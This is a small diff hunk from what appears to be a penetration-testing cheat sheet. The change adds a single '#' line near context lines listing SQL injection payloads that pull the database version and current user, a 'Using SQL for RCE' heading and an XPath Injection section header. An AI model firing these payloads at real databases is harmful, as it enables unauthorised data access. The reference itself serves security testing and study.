@@ -225,6 +225,7 @@ union all select 1,2,3,4,@@version,6,N
 union all select 1,2,3,4,user(),6,N 
 
 # Using SQL for RCE 
+#
 
 ```  
 ### XPath Injection  
